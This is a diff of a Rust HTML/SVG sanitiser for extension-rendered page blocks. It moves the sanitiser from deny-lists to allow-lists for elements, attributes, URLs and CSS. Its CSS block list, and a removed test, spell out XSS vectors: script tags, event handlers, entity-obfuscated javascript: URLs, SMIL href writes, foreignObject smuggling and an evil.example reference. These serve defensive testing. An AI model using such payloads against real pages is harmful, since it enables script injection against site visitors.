@@ -2,41 +2,179 @@
 //!
 //! A block's renderer is an extension's code: a page, a WASI component, a
 //! Rust function. Its HTML (or inline SVG) goes into a page served to
-//! people who never installed it, so nothing in it may run: no
-//! `<script>`, no `on…` handler, no `javascript:` URL, no `<foreignObject>`
-//! carrying HTML into an SVG, no frame or plugin, no `<set>` or
-//! `<animate>` that would write a link. What a drawing needs comes
-//! through: its elements, `class`, `style`, geometry (`viewBox`, `x`,
-//! `width`, `d`, `transform`, …) and its `data-*` attributes, the
-//! player's contract (`data-follow-playhead`, `data-at`, `data-media`).
+//! people who never installed it, from the node's own origin. So what
+//! comes through is decided by allow-lists, never by a list of what is
+//! known to be bad:
+//!
+//! - **Elements.** Inside an `<svg>`, its drawing elements
+//!   ([`SVG_ELEMENTS`], with a `<style>` sheet); outside, basic HTML
+//!   ([`HTML_ELEMENTS`]: text, lists, tables, links, images, `<audio>`,
+//!   `<video>`, `<details>`, and `<button>` for the lyrics block's lines).
+//!   An element that runs or hides markup ([`DROPPED`]: `<script>`,
+//!   `<template>`, `<noscript>`, `<textarea>`, `<foreignObject>`, every
+//!   SMIL animation element, frames, form fields, …) goes with everything
+//!   in it; any other element is left out and its contents kept.
+//! - **Attributes.** `class`, `title`, `lang`, `dir`, `role`, `aria-*`,
+//!   `data-*` (but not the page's own: `data-site-*`, `data-act`), `id`
+//!   (but not the page's own: `site-*`, `share-*`, `comments`), a
+//!   sanitised `style`, an SVG's geometry and presentation
+//!   ([`SVG_ATTRS`]), and a few per element ([`html_attr`]). Never `on…`,
+//!   `srcdoc`, `srcset`, `ping`, `action`, `formaction`.
+//! - **URLs** (`href`, `xlink:href`, `src`), checked as a browser reads
+//!   them (entities decoded, controls and whitespace ignored): a relative
+//!   URL, a `#fragment`, `https:` and `mailto:` for a link, `https:` for
+//!   media, and also `data:image/(png|jpeg|gif|webp)` for an image. An
+//!   SVG `<use>` refers only to its own document (`#id`).
+//! - **CSS.** A `<style>` sheet only inside an `<svg>`, dropped whole when
+//!   it holds `url(`, `@import`, `expression(`, `-moz-binding`,
+//!   `behavior:`, `image-set(`, `src(`, `position: fixed|sticky`, a CSS
+//!   escape (`\`), `&` or `<`; a `style` attribute loses each declaration
+//!   that holds one of those. A sheet is not scoped to its drawing: it can
+//!   restyle the page's own classes. The page's Content-Security-Policy
+//!   (the node's) keeps that from loading or sending anything.
 //!
 //! [`sanitize`] reads the markup into its own model and writes that model
-//! out again: every text escaped, every attribute value quoted and
-//! escaped, every element it opened closed. What a browser parses is
-//! therefore exactly what was kept, whatever the input tried. The element
-//! tree path ([`crate::elements_to_html`]) keeps by the same rules
-//! ([`drops_element`], [`keeps_attr`]).
+//! out again: every text escaped, every attribute value decoded, checked,
+//! then quoted and escaped, every element it opened closed. What a browser
+//! parses is therefore exactly what was checked, whatever the input tried.
+//! An element tree ([`crate::elements_to_html`]) is written as markup and
+//! then goes through [`sanitize`], so both paths keep by the same rules.
 
-/// Elements dropped with everything in them.
+use std::collections::HashSet;
+
+/// SVG elements kept inside an `<svg>`, as written out.
+const SVG_ELEMENTS: &[&str] = &[
+    "svg",
+    "g",
+    "path",
+    "rect",
+    "circle",
+    "ellipse",
+    "line",
+    "polyline",
+    "polygon",
+    "text",
+    "tspan",
+    "textPath",
+    "defs",
+    "use",
+    "symbol",
+    "clipPath",
+    "mask",
+    "pattern",
+    "linearGradient",
+    "radialGradient",
+    "stop",
+    "marker",
+    "title",
+    "desc",
+    "image",
+    "a",
+    "style",
+];
+
+/// HTML elements kept outside an `<svg>`.
+const HTML_ELEMENTS: &[&str] = &[
+    "svg",
+    "div",
+    "span",
+    "p",
+    "br",
+    "hr",
+    "h1",
+    "h2",
+    "h3",
+    "h4",
+    "h5",
+    "h6",
+    "ul",
+    "ol",
+    "li",
+    "dl",
+    "dt",
+    "dd",
+    "table",
+    "caption",
+    "colgroup",
+    "col",
+    "thead",
+    "tbody",
+    "tfoot",
+    "tr",
+    "td",
+    "th",
+    "a",
+    "strong",
+    "em",
+    "b",
+    "i",
+    "u",
+    "s",
+    "code",
+    "pre",
+    "blockquote",
+    "figure",
+    "figcaption",
+    "img",
+    "audio",
+    "video",
+    "source",
+    "details",
+    "summary",
+    "small",
+    "sub",
+    "sup",
+    "time",
+    // The lyrics block's lines seek on click (`lyrics.rs`); only
+    // `type="button"` is kept, and no form field can come through.
+    "button",
+];
+
+/// Elements dropped with everything in them: they run, load, hide markup
+/// in raw text, or are form fields. Any other element outside the lists
+/// above is left out and its contents kept.
 const DROPPED: &[&str] = &[
     "script",
-    "foreignobject",
+    "style",
+    "title",
+    "noscript",
+    "template",
+    "textarea",
+    "xmp",
+    "plaintext",
+    "listing",
+    "noembed",
+    "noframes",
     "iframe",
     "frame",
     "frameset",
     "object",
     "embed",
     "applet",
+    "portal",
+    "fencedframe",
     "base",
     "meta",
     "link",
-    "noscript",
-    "template",
-    "portal",
-    "xmp",
-    "noembed",
-    "noframes",
-    "plaintext",
+    "head",
+    "foreignobject",
+    "math",
+    "select",
+    "option",
+    "optgroup",
+    "datalist",
+    "input",
+    "canvas",
+    "animate",
+    "set",
+    "animatetransform",
+    "animatemotion",
+    "animatecolor",
+    "discard",
+    "mpath",
+    "handler",
+    "listener",
+    "filter",
 ];
 
 /// HTML elements with no closing tag.
@@ -45,80 +183,339 @@ pub(crate) const VOID: &[&str] = &[
     "wbr",
 ];
 
-/// Attributes whose value is a URL.
-const URLS: &[&str] = &[
-    "href",
-    "xlink:href",
-    "src",
-    "action",
-    "formaction",
-    "poster",
-    "background",
-    "cite",
-    "data",
-    "codebase",
+/// An SVG's geometry and presentation attributes, in lower case.
+const SVG_ATTRS: &[&str] = &[
+    "viewbox",
+    "preserveaspectratio",
+    "version",
+    "x",
+    "y",
+    "x1",
+    "y1",
+    "x2",
+    "y2",
+    "cx",
+    "cy",
+    "r",
+    "rx",
+    "ry",
+    "fx",
+    "fy",
+    "fr",
+    "dx",
+    "dy",
+    "width",
+    "height",
+    "d",
+    "points",
+    "pathlength",
+    "transform",
+    "fill",
+    "fill-opacity",
+    "fill-rule",
+    "stroke",
+    "stroke-width",
+    "stroke-opacity",
+    "stroke-linecap",
+    "stroke-linejoin",
+    "stroke-dasharray",
+    "stroke-dashoffset",
+    "stroke-miterlimit",
+    "opacity",
+    "color",
+    "visibility",
+    "display",
+    "overflow",
+    "vector-effect",
+    "shape-rendering",
+    "text-rendering",
+    "paint-order",
+    "clip-path",
+    "clip-rule",
+    "mask",
+    "marker-start",
+    "marker-mid",
+    "marker-end",
+    "font-family",
+    "font-size",
+    "font-weight",
+    "font-style",
+    "font-variant",
+    "text-anchor",
+    "text-decoration",
+    "dominant-baseline",
+    "alignment-baseline",
+    "baseline-shift",
+    "letter-spacing",
+    "word-spacing",
+    "writing-mode",
+    "rotate",
+    "textlength",
+    "lengthadjust",
+    "startoffset",
+    "method",
+    "spacing",
+    "side",
+    "offset",
+    "stop-color",
+    "stop-opacity",
+    "gradientunits",
+    "gradienttransform",
+    "spreadmethod",
+    "patternunits",
+    "patterncontentunits",
+    "patterntransform",
+    "clippathunits",
+    "maskunits",
+    "maskcontentunits",
+    "markerwidth",
+    "markerheight",
+    "markerunits",
+    "refx",
+    "refy",
+    "orient",
 ];
 
-/// Whether the element `tag` with `attrs` is dropped, with its children.
-pub(crate) fn drops_element<'a>(
-    tag: &str,
-    mut attrs: impl Iterator<Item = (&'a str, &'a str)>,
-) -> bool {
-    let tag = tag.to_ascii_lowercase();
-    if DROPPED.contains(&tag.as_str()) {
-        return true;
-    }
-    // SMIL that writes a link (`<set attributeName="href"
-    // to="javascript:…">`) is a script by another name.
-    if matches!(
-        tag.as_str(),
-        "set" | "animate" | "animatemotion" | "animatetransform"
-    ) {
-        return attrs.any(|(name, value)| {
-            name.eq_ignore_ascii_case("attributeName")
-                && value.trim().to_ascii_lowercase().ends_with("href")
-        });
-    }
-    false
+/// Attributes any kept element may carry, in lower case (`id` and `style`
+/// are checked further; `aria-*` and `data-*` by prefix).
+const GLOBAL_ATTRS: &[&str] = &["class", "id", "title", "lang", "dir", "role", "style"];
+
+/// What CSS may not hold, looked for in lower case with comments and
+/// whitespace taken out: anything that loads, binds or runs, and a box
+/// pinned over the page.
+const CSS_REFUSED: &[&str] = &[
+    "url(",
+    "@import",
+    "expression(",
+    "-moz-binding",
+    "behavior:",
+    "behaviour:",
+    "image-set(",
+    "image(",
+    "cross-fade(",
+    "element(",
+    "src(",
+    "javascript:",
+    "position:fixed",
+    "position:sticky",
+];
+
+const SVG_NS: &str = "http://www.w3.org/2000/svg";
+const XLINK_NS: &str = "http://www.w3.org/1999/xlink";
+
+/// What becomes of an element.
+#[derive(Clone, Copy, Debug, PartialEq, Eq)]
+pub(crate) enum Rule {
+    /// Written, by this name.
+    Keep(&'static str),
+    /// Left out; its contents are read as if it were not there.
+    Unwrap,
+    /// Left out with everything in it.
+    Drop,
 }
 
-/// Whether the attribute `name` = `value` (its text, entities already
-/// decoded) of a `tag` is kept.
-pub(crate) fn keeps_attr(tag: &str, name: &str, value: &str) -> bool {
+/// What becomes of the element `tag`, inside an `<svg>` or not.
+pub(crate) fn element_rule(tag: &str, in_svg: bool) -> Rule {
+    let list = if in_svg { SVG_ELEMENTS } else { HTML_ELEMENTS };
+    if let Some(name) = list.iter().find(|n| n.eq_ignore_ascii_case(tag)) {
+        return Rule::Keep(name);
+    }
+    if DROPPED.iter().any(|n| n.eq_ignore_ascii_case(tag)) {
+        return Rule::Drop;
+    }
+    Rule::Unwrap
+}
+
+/// What the attribute `name` = `value` (its text, entities decoded) of a
+/// kept element `tag` (as [`element_rule`] names it) is written as;
+/// `None` when it is dropped. `in_svg` is true for an `<svg>` and what is
+/// inside one.
+pub(crate) fn attr_rule(tag: &str, name: &str, value: &str, in_svg: bool) -> Option<String> {
     if !is_name(name) {
-        return false;
+        return None;
     }
     let lower = name.to_ascii_lowercase();
-    if lower.starts_with("on") || lower == "srcdoc" || lower == "is" {
-        return false;
-    }
-    if URLS.contains(&lower.as_str()) || lower.ends_with(":href") {
-        // An SVG `<use>` only of the drawing's own parts.
-        if tag.eq_ignore_ascii_case("use") && !value.trim_start().starts_with('#') {
-            return false;
+    let value: String = value
+        .chars()
+        .filter(|c| !c.is_control() || matches!(c, '\t' | '\n' | '\r'))
+        .collect();
+    match lower.as_str() {
+        "style" => return clean_style(&value),
+        "id" => return (!value.is_empty() && !reserved_id(&value)).then_some(value),
+        "href" | "xlink:href" => {
+            let ok = match tag {
+                "use" => is_fragment(&value),
+                "a" => url_ok(&value, Url::Link),
+                "image" => url_ok(&value, Url::Image),
+                _ => false,
+            };
+            return ok.then_some(value);
         }
-        return safe_url(value);
+        "src" => {
+            let ok = match tag {
+                "img" => url_ok(&value, Url::Image),
+                "audio" | "video" | "source" => url_ok(&value, Url::Media),
+                _ => false,
+            };
+            return ok.then_some(value);
+        }
+        "xmlns" => return (in_svg && value == SVG_NS).then_some(value),
+        "xmlns:xlink" => return (in_svg && value == XLINK_NS).then_some(value),
+        _ => {}
     }
-    true
+    if lower.starts_with("aria-") && lower.len() > 5 {
+        return Some(value);
+    }
+    if let Some(rest) = lower.strip_prefix("data-") {
+        return (!rest.is_empty() && !rest.starts_with("site-") && rest != "act").then_some(value);
+    }
+    if GLOBAL_ATTRS.contains(&lower.as_str()) || html_attr(tag, &lower, &value) {
+        return Some(value);
+    }
+    if in_svg && SVG_ATTRS.contains(&lower.as_str()) {
+        // A presentation attribute is CSS: it may point at the drawing's
+        // own gradients (`url(#g)`), never at anything else.
+        return (!value.contains('\\') && local_refs_only(&value)).then_some(value);
+    }
+    None
 }
 
-/// Whether `url` names nothing that runs: not `javascript:`/`vbscript:`,
-/// and `data:` only for an image. A browser ignores tabs, newlines and
-/// leading spaces in a scheme, so they are ignored here too.
-fn safe_url(url: &str) -> bool {
-    let squeezed: String = url
-        .chars()
-        .filter(|c| !c.is_ascii_whitespace() && !c.is_ascii_control())
-        .take(32)
+/// The attributes an HTML element `tag` has of its own.
+fn html_attr(tag: &str, lower: &str, value: &str) -> bool {
+    match (tag, lower) {
+        ("img" | "video", "width" | "height")
+        | ("img", "alt")
+        | ("audio" | "video", "controls" | "preload")
+        | ("source", "type")
+        | ("time", "datetime")
+        | ("td" | "th", "colspan" | "rowspan")
+        | ("col" | "colgroup", "span")
+        | ("details", "open") => true,
+        ("button", "type") => value.eq_ignore_ascii_case("button"),
+        _ => false,
+    }
+}
+
+/// An `id` the page's own script looks up (`site-queue`, `site-nav`,
+/// `site-search`, `site-results`, `site-main`, `site-result-*`) or the
+/// share page writes (`share-*`, `comments`): a block's would win.
+fn reserved_id(id: &str) -> bool {
+    let lower = id.trim().to_ascii_lowercase();
+    lower.starts_with("site-") || lower.starts_with("share-") || lower == "comments"
+}
+
+/// What a URL is for.
+#[derive(Clone, Copy, PartialEq, Eq)]
+enum Url {
+    /// `<a href>`: relative, `#…`, `https:`, `mailto:`.
+    Link,
+    /// `<img src>`, `<image href>`: relative, `https:`, a raster `data:`.
+    Image,
+    /// `<audio>`/`<video>`/`<source>` `src`: relative, `https:`.
+    Media,
+}
+
+/// `url` as a browser reads it for its scheme: no ASCII whitespace or
+/// controls anywhere, `\` as `/`, lower case.
+fn squeeze(url: &str) -> String {
+    url.chars()
+        .filter(|c| !c.is_ascii_whitespace() && !c.is_control())
+        .map(|c| if c == '\\' { '/' } else { c })
         .collect::<String>()
-        .to_ascii_lowercase();
-    if squeezed.starts_with("javascript:") || squeezed.starts_with("vbscript:") {
+        .to_ascii_lowercase()
+}
+
+/// Whether `url` is a reference into the same document (`#id`).
+fn is_fragment(url: &str) -> bool {
+    squeeze(url)
+        .strip_prefix('#')
+        .is_some_and(|f| !f.is_empty())
+}
+
+/// Whether `url` may be used `for` what it is.
+fn url_ok(url: &str, used: Url) -> bool {
+    let url = squeeze(url);
+    if url.starts_with('#') {
+        return used == Url::Link;
+    }
+    let scheme_end = url.find([':', '/', '?', '#']);
+    let Some(colon) = scheme_end.filter(|&i| url.get(i..).is_some_and(|r| r.starts_with(':')))
+    else {
+        // No scheme: relative, but not `//host/…`, another site.
+        return !url.starts_with("//");
+    };
+    let (scheme, rest) = url.split_at(colon);
+    match scheme {
+        "https" => true,
+        "mailto" => used == Url::Link,
+        "data" => {
+            used == Url::Image
+                && ["png", "jpeg", "gif", "webp"].iter().any(|kind| {
+                    rest.strip_prefix(":image/")
+                        .and_then(|r| r.strip_prefix(kind))
+                        .is_some_and(|r| r.starts_with([';', ',']))
+                })
+        }
+        _ => false,
+    }
+}
+
+/// Whether every `url(…)` in a CSS value names a part of this document
+/// (`url(#g)`).
+fn local_refs_only(value: &str) -> bool {
+    let lower = value.to_ascii_lowercase();
+    lower.match_indices("url(").all(|(at, _)| {
+        lower
+            .get(at.saturating_add(4)..)
+            .unwrap_or_default()
+            .trim_start_matches(|c: char| c.is_ascii_whitespace() || c == '"' || c == '\'')
+            .starts_with('#')
+    })
+}
+
+/// `css` without its comments; an unclosed one runs to the end.
+fn strip_css_comments(css: &str) -> String {
+    let mut out = String::with_capacity(css.len());
+    let mut rest = css;
+    while let Some((before, after)) = rest.split_once("/*") {
+        out.push_str(before);
+        rest = after.split_once("*/").map_or("", |(_, r)| r);
+    }
+    out.push_str(rest);
+    out
+}
+
+/// Whether `css` holds nothing of [`CSS_REFUSED`] and no CSS escape (which
+/// would spell any of it another way).
+fn css_ok(css: &str) -> bool {
+    if css.contains('\\') {
         return false;
     }
-    if squeezed.starts_with("data:") {
-        return squeezed.starts_with("data:image/") && !squeezed.starts_with("data:image/svg");
-    }
-    true
+    let squeezed: String = strip_css_comments(css)
+        .chars()
+        .filter(|c| !c.is_whitespace() && !c.is_control())
+        .collect::<String>()
+        .to_ascii_lowercase();
+    !CSS_REFUSED.iter().any(|bad| squeezed.contains(bad))
+}
+
+/// A `style` attribute without the declarations [`css_ok`] refuses;
+/// `None` when nothing is left.
+fn clean_style(value: &str) -> Option<String> {
+    let kept: Vec<&str> = value
+        .split(';')
+        .map(str::trim)
+        .filter(|d| !d.is_empty() && css_ok(d))
+        .collect();
+    let out = kept.join("; ");
+    (!out.is_empty() && css_ok(&out)).then_some(out)
+}
+
+/// Whether a `<style>` sheet comes through, whole: [`css_ok`], and no `<`
+/// or `&`, which an SVG's sheet (not raw text) would read as markup or a
+/// character reference.
+fn sheet_ok(css: &str) -> bool {
+    !css.contains(['<', '&']) && css_ok(css)
 }
 
 /// A tag or attribute name: letters, digits, `-`, `_`, `:` and `.`,
@@ -130,8 +527,8 @@ pub(crate) fn is_name(name: &str) -> bool {
             .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | ':' | '.'))
 }
 
-/// `markup` (HTML or inline SVG), with only what [`drops_element`] and
-/// [`keeps_attr`] keep, re-written well formed.
+/// `markup` (HTML or inline SVG), with only what the allow-lists keep,
+/// re-written well formed.
 ///
 /// It takes time and space linear in `markup` on any input: block markup
 /// comes from extensions and notes, so a sanitiser that could be made to
@@ -183,48 +580,37 @@ const MAX_OPEN: usize = 256;
 #[derive(Default)]
 struct Writer {
     out: String,
-    /// The elements open, by their name as written.
-    open: Vec<String>,
+    /// The elements open, by the name written.
+    open: Vec<&'static str>,
+    /// How many of them are `<svg>`s.
+    svgs: usize,
 }
 
 impl Writer {
-    fn in_style(&self) -> bool {
+    const fn in_svg(&self) -> bool {
+        self.svgs > 0
+    }
+
+    /// Inside an SVG's `<title>` or `<desc>`, where a browser reads markup
+    /// as HTML: text only.
+    fn in_text_only(&self) -> bool {
         self.open
             .last()
-            .is_some_and(|t| t.eq_ignore_ascii_case("style"))
+            .is_some_and(|t| matches!(*t, "title" | "desc"))
     }
 
     /// One pass of [`sanitize`]: text up to the next `<` and the markup
     /// after it. Returns the rest, always shorter than `rest`.
     fn step<'a>(&mut self, rest: &'a str) -> &'a str {
-        if self.in_style() {
-            // A style sheet is raw text up to its end tag.
-            let (text, tail) = cut(rest, find_ci(rest, "</style").unwrap_or(rest.len()));
-            self.text(text);
-            // `tail` is empty, or starts with the `<` of `</style`, which
-            // this pass consumes: `markup` reads what follows a `<`.
-            return tail.get(1..).map_or("", |after| self.markup(after));
-        }
         match rest.split_once('<') {
             None => {
-                self.text(rest);
+                escape_keeping_entities(rest, &mut self.out);
                 ""
             }
             Some((text, after)) => {
-                self.text(text);
+                escape_keeping_entities(text, &mut self.out);
                 self.markup(after)
             }
-        }
-    }
-
-    /// Text, its entities kept when well formed.
-    fn text(&mut self, text: &str) {
-        if self.in_style() {
-            // A style sheet is raw text in HTML: written as is, without
-            // anything that could end it.
-            self.out.extend(text.chars().filter(|&c| c != '<'));
-        } else {
-            escape_keeping_entities(text, &mut self.out);
         }
     }
 
@@ -255,26 +641,34 @@ impl Writer {
         }
         let (name, tail) = take_name(after);
         let (attrs, self_closing, rest) = take_attrs(tail);
-        if drops_element(name, attrs.iter().map(|(n, v)| (n.as_str(), v.as_str()))) {
-            return if self_closing {
-                rest
-            } else {
-                skip_element(name, rest)
-            };
+        let void = VOID.iter().any(|v| v.eq_ignore_ascii_case(name));
+        let tag = match element_rule(name, self.in_svg()) {
+            Rule::Drop if self_closing || void => return rest,
+            Rule::Drop => return skip_element(name, rest),
+            Rule::Unwrap => return rest,
+            Rule::Keep(_) if !is_name(name) || self.in_text_only() => return rest,
+            Rule::Keep(tag) => tag,
+        };
+        if tag == "style" {
+            return self.sheet(self_closing, rest);
         }
-        let lower = name.to_ascii_lowercase();
-        let void = VOID.contains(&lower.as_str());
-        if !is_name(name) || (!void && !self_closing && self.open.len() >= MAX_OPEN) {
+        if !void && !self_closing && self.open.len() >= MAX_OPEN {
             return rest;
         }
+        let in_svg = self.in_svg() || tag == "svg";
         self.out.push('<');
-        self.out.push_str(name);
+        self.out.push_str(tag);
+        let mut seen = HashSet::new();
         for (attr, value) in &attrs {
-            if keeps_attr(name, attr, &decode(value)) {
+            // A browser keeps the first of two attributes of one name.
+            if !seen.insert(attr.to_ascii_lowercase()) {
+                continue;
+            }
+            if let Some(value) = attr_rule(tag, attr, &decode(value), in_svg) {
                 self.out.push(' ');
                 self.out.push_str(attr);
                 self.out.push_str("=\"");
-                escape_keeping_entities(value, &mut self.out);
+                escape(&value, &mut self.out);
                 self.out.push('"');
             }
         }
@@ -284,12 +678,32 @@ impl Writer {
         }
         if self_closing {
             self.out.push_str("</");
-            self.out.push_str(name);
+            self.out.push_str(tag);
             self.out.push('>');
         } else {
-            self.open.push(name.to_owned());
+            self.open.push(tag);
+            if tag == "svg" {
+                self.svgs = self.svgs.saturating_add(1);
+            }
         }
         rest
+    }
+
+    /// An SVG's `<style>` sheet, whose start tag was just read: written
+    /// whole when [`sheet_ok`], else not at all. The rest after its end
+    /// tag.
+    fn sheet<'a>(&mut self, self_closing: bool, rest: &'a str) -> &'a str {
+        if self_closing {
+            return rest;
+        }
+        let (css, tail) = cut(rest, find_end_tag(rest, "</style").unwrap_or(rest.len()));
+        let after = tail.split_once('>').map_or("", |(_, r)| r);
+        if sheet_ok(css) && self.open.len() < MAX_OPEN {
+            self.out.push_str("<style>");
+            self.out.push_str(css);
+            self.out.push_str("</style>");
+        }
+        after
     }
 
     /// Close `name` and what is open inside it; nothing when it is not
@@ -298,18 +712,23 @@ impl Writer {
         let Some(at) = self.open.iter().rposition(|t| t.eq_ignore_ascii_case(name)) else {
             return;
         };
-        for tag in self.open.split_off(at).iter().rev() {
-            self.out.push_str("</");
-            self.out.push_str(tag);
-            self.out.push('>');
+        for tag in self.open.split_off(at).into_iter().rev() {
+            self.end(tag);
         }
     }
 
+    fn end(&mut self, tag: &str) {
+        if tag == "svg" {
+            self.svgs = self.svgs.saturating_sub(1);
+        }
+        self.out.push_str("</");
+        self.out.push_str(tag);
+        self.out.push('>');
+    }
+
     fn finish(mut self) -> String {
-        for tag in self.open.drain(..).rev() {
-            self.out.push_str("</");
-            self.out.push_str(&tag);
-            self.out.push('>');
+        for tag in std::mem::take(&mut self.open).into_iter().rev() {
+            self.end(tag);
         }
         self.out
     }
@@ -320,6 +739,23 @@ fn find_ci(hay: &str, needle: &str) -> Option<usize> {
     hay.as_bytes()
         .windows(needle.len())
         .position(|w| w.eq_ignore_ascii_case(needle.as_bytes()))
+}
+
+/// Where the end tag `needle` (`</name`, ASCII, lower case) starts in
+/// `hay`, in any case: followed by whitespace, `/`, `>` or the end, so
+/// `</styles>` is not `</style`. Each search starts past the last, so
+/// this reads `hay` once.
+fn find_end_tag(hay: &str, needle: &str) -> Option<usize> {
+    let mut from = 0usize;
+    loop {
+        let at = from.saturating_add(find_ci(hay.get(from..)?, needle)?);
+        let past = at.saturating_add(needle.len());
+        match hay.as_bytes().get(past) {
+            None => return Some(at),
+            Some(b) if b.is_ascii_whitespace() || matches!(b, b'/' | b'>') => return Some(at),
+            Some(_) => from = past,
+        }
+    }
 }
 
 /// A name at the start of `s` (up to whitespace, `/`, `>`, `<` or `=`),
@@ -472,7 +908,8 @@ fn numeric(name: &str) -> Option<(&str, u32)> {
     )
 }
 
-/// `value` with its character references decoded, for checking a URL.
+/// `value` with its character references decoded, as a browser reads an
+/// attribute: what is checked, and then written (escaped).
 /// A named one it does not know becomes U+FFFD, which no scheme has.
 fn decode(value: &str) -> String {
     let mut out = String::with_capacity(value.len());
@@ -498,6 +935,20 @@ fn decode(value: &str) -> String {
                 "Tab" => Some('\t'),
                 "NewLine" => Some('\n'),
                 "nbsp" => Some('\u{a0}'),
+                "copy" => Some('©'),
+                "reg" => Some('®'),
+                "trade" => Some('™'),
+                "hellip" => Some('…'),
+                "ndash" => Some('–'),
+                "mdash" => Some('—'),
+                "lsquo" => Some('‘'),
+                "rsquo" => Some('’'),
+                "ldquo" => Some('“'),
+                "rdquo" => Some('”'),
+                "times" => Some('×'),
+                "middot" => Some('·'),
+                "sharp" => Some('♯'),
+                "flat" => Some('♭'),
                 _ => None,
             },
         };
@@ -530,7 +981,7 @@ mod tests {
     /// playhead, a transparent rect per played bar. All of it comes
     /// through: geometry, classes, `data-*`, a style sheet, gradients
     /// referenced by `#id`, text.
-    const CHART: &str = r##"<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 400 120" width="400" height="120" class="kf-chart" data-follow-playhead="" data-media="/s/abc/joy.mp3"><style>.kf-bar { fill: transparent } .kf-bar[aria-current] { fill: var(--accent) }</style><defs><linearGradient id="g"><stop offset="0" stop-color="#fff"/></linearGradient></defs><rect class="kf-bar" data-at="0" x="0" y="0" width="100" height="120"/><rect class="kf-bar" data-at="2.5" x="100" y="0" width="100" height="120"/><path d="M0 60 L400 60" stroke="currentColor" stroke-width="1.5" transform="translate(0,1)"/><use href="#g"/><text x="4" y="20" font-size="12">C &amp; G</text><a href="#bar-2"><circle cx="5" cy="5" r="2"/></a></svg>"##;
+    const CHART: &str = r##"<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 400 120" width="400" height="120" class="kf-chart" data-follow-playhead="" data-media="/s/abc/joy.mp3"><style>.kf-bar { fill: transparent } .kf-bar[aria-current] { fill: var(--accent) }</style><defs><linearGradient id="g"><stop offset="0" stop-color="#fff"/></linearGradient></defs><rect class="kf-bar" data-at="0" x="0" y="0" width="100" height="120"/><rect class="kf-bar" data-at="2.5" x="100" y="0" width="100" height="120" fill="url(#g)"/><path d="M0 60 L400 60" stroke="currentColor" stroke-width="1.5" transform="translate(0,1)"/><use href="#g"/><text x="4" y="20" font-size="12">C &amp; G</text><a href="#bar-2"><circle cx="5" cy="5" r="2"/></a></svg>"##;
 
     #[test]
     fn an_svg_drawing_comes_through_whole() {
@@ -541,7 +992,7 @@ mod tests {
             r#"data-follow-playhead="""#,
             r#"data-media="/s/abc/joy.mp3""#,
             r#"<rect class="kf-bar" data-at="0" x="0" y="0" width="100" height="120"></rect>"#,
-            r#"data-at="2.5""#,
+            r#"data-at="2.5" x="100" y="0" width="100" height="120" fill="url(#g)""#,
             r#"<path d="M0 60 L400 60" stroke="currentColor" stroke-width="1.5" transform="translate(0,1)"></path>"#,
             r##"<linearGradient id="g"><stop offset="0" stop-color="#fff"></stop></linearGradient>"##,
             r##"<use href="#g"></use>"##,
@@ -555,100 +1006,399 @@ mod tests {
         assert!(out.ends_with("</svg>"), "{out}");
         // Written again, it is the same: nothing left to take out.
         assert_eq!(sanitize(&out), out);
+        assert_safe(&out, CHART);
     }
 
+    /// The first-party blocks: the lyrics block's list and an HTML block
+    /// with media and a table.
     #[test]
-    fn nothing_scriptable_comes_through() {
-        let bad = [
-            "<svg><script>alert(1)</script><rect/></svg>",
-            "<svg><script href=\"x.js\"/><rect/></svg>",
-            "<svg onload=\"alert(1)\"><rect onclick='x()' ONMOUSEOVER=x/></svg>",
-            "<svg><a href=\"javascript:alert(1)\">x</a></svg>",
-            "<svg><a xlink:href=\" JaVa&#x09;Script:alert(1)\">x</a></svg>",
-            "<svg><a href=\"&#106;avascript:alert(1)\">x</a></svg>",
-            "<svg><a href=\"java&Tab;script:alert(1)\">x</a></svg>",
-            "<svg><foreignObject><div onclick=\"x()\"><script>alert(1)</script></div><iframe src=\"/\"></iframe></foreignObject><rect/></svg>",
-            "<svg><foreignobject><foreignObject></foreignObject><img src=x onerror=alert(1)></foreignobject></svg>",
-            "<svg><set attributeName=\"href\" to=\"javascript:alert(1)\"/><animate attributeName=\"xlink:href\" values=\"javascript:alert(1)\"></animate></svg>",
-            "<svg><use href=\"data:image/svg+xml;base64,PHN2Zz4=#x\"/><use href=\"https://evil.example/x.svg#y\"/></svg>",
-            "<svg><image href=\"data:text/html,<script>alert(1)</script>\"/></svg>",
-            "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe><object data=\"x\"></object><embed src=\"x\">",
-            "<div><script>document.write('</div><img src=x onerror=alert(1)>')</script></div>",
-            "<svg><!--<script>alert(1)</script>--><rect/></svg>",
-            "<svg><![CDATA[<script>alert(1)</script>]]></svg>",
-            "<scr<script>ipt>alert(1)</script>",
-            "<a href='javascript:alert(1)'>x</a><base href=\"javascript:/\"><meta http-equiv=refresh content=\"0;url=javascript:alert(1)\">",
+    fn first_party_blocks_come_through_whole() {
+        let lyrics = "<ol class=\"site-lyrics\" data-follow-playhead data-media=\"/s/x/a b.mp3\"><li data-at=\"1.500\"><button type=\"button\" class=\"site-lyric\">&lt;Me&gt; &amp; you</button></li></ol>";
+        assert_eq!(
+            sanitize(lyrics),
+            "<ol class=\"site-lyrics\" data-follow-playhead=\"\" data-media=\"/s/x/a b.mp3\"><li data-at=\"1.500\"><button type=\"button\" class=\"site-lyric\">&lt;Me&gt; &amp; you</button></li></ol>"
+        );
+        let html = "<figure><audio controls preload=\"none\" src=\"/s/x/a.mp3\"></audio><figcaption><em>Take</em> 1</figcaption></figure><table><tr><td colspan=\"2\">C</td></tr></table><details open><summary>More</summary><img src=\"data:image/png;base64,AA\" alt=\"a\"></details>";
+        assert_eq!(
+            sanitize(html),
+            "<figure><audio controls=\"\" preload=\"none\" src=\"/s/x/a.mp3\"></audio><figcaption><em>Take</em> 1</figcaption></figure><table><tr><td colspan=\"2\">C</td></tr></table><details open=\"\"><summary>More</summary><img src=\"data:image/png;base64,AA\" alt=\"a\"></details>"
+        );
+    }
+
+    /// The review of #520: each reproduction, and the classic ways past a
+    /// sanitiser. `Some(out)` is the exact output; every row's output is
+    /// also checked by [`assert_safe`] and for `never`.
+    #[test]
+    #[allow(
+        clippy::literal_string_with_formatting_args,
+        reason = "CSS rules in the inputs, not format arguments"
+    )]
+    fn adversarial_inputs_table() {
+        let table: &[(&str, Option<&str>)] = &[
+            // Finding 2: an entity in SMIL's attributeName.
+            (
